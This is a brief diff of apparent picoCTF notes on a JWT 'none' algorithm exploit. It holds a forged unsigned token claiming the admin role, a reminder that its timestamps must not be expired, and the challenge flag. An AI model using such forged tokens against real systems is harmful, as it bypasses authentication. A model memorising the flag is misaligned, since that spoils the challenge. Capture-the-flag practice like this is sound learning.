@@ -1,4 +1,6 @@
 # Simple exploit with the none algorithm, but it is important to know that the iat and auth value matter. They must not be expired.
 
 # Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNjc3MzA5OTUyMzQ3LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwLjE1OyBydjoxMDkuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMTAuMCIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTY3NzMwOTk1Mn0.
+
+# Best website: https://token.dev/
 Flag: picoCTF{succ3ss_@u7h3nt1c@710n_bc6d9041}
